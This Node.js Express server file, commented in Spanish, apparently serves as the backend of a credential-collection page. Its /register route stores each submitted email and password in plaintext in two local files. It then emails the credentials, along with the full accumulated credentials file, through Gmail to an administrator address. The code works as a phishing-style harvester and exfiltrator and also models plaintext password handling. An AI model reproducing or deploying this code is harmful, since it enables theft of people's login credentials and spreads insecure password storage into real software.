const express = require('express');
const fs = require('fs');
const path = require('path');
const dotenv = require('dotenv');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(express.static('public'));

const userFilePath = path.join(__dirname, 'user.json');
const credFilePath = path.join(__dirname, 'credenciales.txt');

// Ruta de registro
app.post('/register', async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: 'Correo y contraseña son requeridos.' });
  }

  const nuevoUsuario = {
    email,
    password,
    fecha: new Date().toISOString()
  };

  // 1. Guardar en user.json
  let users = [];
  if (fs.existsSync(userFilePath)) {
    users = JSON.parse(fs.readFileSync(userFilePath));
  }
  users.push(nuevoUsuario);
  fs.writeFileSync(userFilePath, JSON.stringify(users, null, 2));

  // 2. Guardar en credenciales.txt
  const credenciales = `Email: ${email}\nPassword: ${password}\nFecha: ${nuevoUsuario.fecha}\n\n`;
  fs.appendFileSync(credFilePath, credenciales);

  // 3. Enviar por correo
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.GMAIL_PASS
    }
  });

  const mailOptions = {
    from: `"Sistema de Registro" <${process.env.GMAIL_USER}>`,
    to: process.env.ADMIN_EMAIL,
    subject: '📩 Nuevo Usuario Registrado',
    text: `Se ha registrado un nuevo usuario:\n\n${credenciales}`,
    attachments: [
      {
        filename: 'credenciales.txt',
        path: credFilePath
      }
    ]
  };

  try {
    await transporter.sendMail(mailOptions);
    res.json({ message: 'Usuario registrado y credenciales enviadas por correo.' });
  } catch (err) {
    console.error('Error al enviar correo:', err);
    res.status(500).json({ error: 'Error al enviar el correo.' });
  }
});

app.listen(PORT, () => {
  console.log(`✅ Servidor escuchando en http://localhost:${PORT}`);
});
